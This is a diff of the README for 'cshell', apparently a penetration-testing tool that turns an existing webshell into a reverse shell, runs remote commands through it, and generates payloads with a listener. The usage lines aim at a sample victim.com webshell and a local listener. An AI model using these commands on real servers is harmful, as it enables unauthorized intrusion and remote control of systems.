@@ -4,9 +4,9 @@
   
 ***  
 This script takes a working webshell as an argument and can perform the following operations  
-- rev : This option sends a payload according to your choice and triggers that payload on the target webshell<br\>  
-- web : This parameter can execute direct command on the webshell using persisted working directory and error message<br/>  
-- lstnr : This option generates a payload and copies it to the clipboard. It can also start a listener, and also encodes the payload [Both are Optional]  
+- rev : This module sends a payload according to your choice and triggers that payload on the target webshell</br>  
+- web : This module can execute direct command on the webshell using persisted working directory and error message</br>  
+- lstnr : This module generates a payload and copies it to the clipboard. It can also start a listener, and also encodes the payload [Both are Optional]  
   
 ## Install  
 - From PIP library :   
@@ -39,16 +39,16 @@ lstnr   Generate payload, copy it to your clipboard and start a listener[Optiona
 ```
 
 - **Getting a reverse shell from a webshell :**   
-	- GET Method  : `cshell rev -i <Interface or IP> <Target URL with REV as command>`  
-	- POST Method : `cshell rev -i <Interface or IP> -m POST -d <Post DATA in JSON format with REV as command> <Target URL>`  
+	- GET Method  : `cshell rev -i <Interface or IP. Example : 127.0.0.1 or lo> <Target URL with REV as command. Example : http://victim.com/webshell.php?cmd=REV>`  
+	- POST Method : `cshell rev -i <Interface or IP. Example : 127.0.0.1 or lo> -m POST -d <Post DATA in JSON format with REV as command. Example : '{"cmd" : "REV"}'> <Target URL. Example : http://victim.com/webshell.php>`  
 - **Interacting with a webshell** :   
-	- GET Method : `cshell web <Target URL with WEB as command>`  
-	- Post Method : `cshell rev -m POST -d <Post DATA in JSON format with WEB as command> <Target URL>`  
+	- GET Method : `cshell web <Target URL with WEB as command. Example : http://victim.com/webshell.php?cmd=WEB>`  
+	- Post Method : `cshell rev -m POST -d <Post DATA in JSON format with WEB as command. Example : '{"cmd" : "WEB"}'> <Target URL. Example : http://victim.com/webshell.php>`  
 - **Generating a payload** :   
-	- `cshell lstnr -f <Format> -i <Interface or IP>  -p <Port> -f <Payload format>`  
+	- `cshell lstnr -f <Format. Example : bash> -i <Interface or IP. Example : 127.0.0.1 or lo>  -p <Port. Example : 1337>
   
 
-## Custom Commands : 
+## Custom commands for WEB module : 
 - `help` - Help menu of custom commands  
 - `clear` - Clear the screen  
 - `exit` - Exit the shell  
